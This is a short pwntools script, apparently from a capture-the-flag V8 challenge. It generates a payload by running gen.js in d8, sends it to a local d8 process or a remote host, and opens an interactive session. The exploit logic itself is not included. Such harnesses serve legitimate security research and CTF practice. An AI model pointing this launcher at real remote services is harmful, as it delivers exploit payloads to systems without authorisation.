from pwn import *

import subprocess

payload = subprocess.check_output(["bin/d8", "gen.js"])

if args.REMOTE:
    r = remote(args.HOST, args.PORT)
else:
    r = process("bin/d8")

r.sendline(payload)
r.interactive()
